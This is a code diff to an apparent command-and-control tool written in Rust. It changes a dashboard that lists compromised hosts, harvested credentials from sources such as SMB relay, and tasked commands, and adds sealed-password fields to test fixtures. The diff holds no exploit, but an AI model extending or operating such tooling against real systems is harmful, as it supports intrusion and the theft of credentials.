@@ -56,7 +56,7 @@ pub const DASHBOARD_HTML: &str = r#"<!DOCTYPE html>
     }
     function loadAll() {
       load('/api/hosts', 'hosts', h => [h.ip, h.hostname, h.os, h.status].map(x => `<td>${esc(x)}</td>`));
-      load('/api/secrets', 'secrets', s => [s.host_id, s.cred_type, s.username, s.password, s.source].map(x => `<td>${esc(x)}</td>`));
+      load('/api/secrets', 'secrets', s => [s.host_id, s.cred_type, s.username, s.password || '<verschluesselt>', s.source].map(x => `<td>${esc(x)}</td>`));
       load('/api/tasks', 'tasks', t => [t.host_id, t.command, t.status, t.result].map(x => `<td>${esc(x)}</td>`));
     }
     document.getElementById('login').addEventListener('submit', async ev => {
@@ -156,6 +156,7 @@ mod tests {
             status: c2::STATUS_COMPROMISED.into(),
             first_seen: "2026-11-11T00:00:00Z".into(),
             last_seen: "2026-11-11T00:05:00Z".into(),
+            sealed_master: String::new(),
         }
     }
 
@@ -168,6 +169,7 @@ mod tests {
             password: "hash".into(),
             source: "smb_relay".into(),
             collected_at: "2026-11-11T00:05:00Z".into(),
+            sealed_password: String::new(),
         }
     }
 
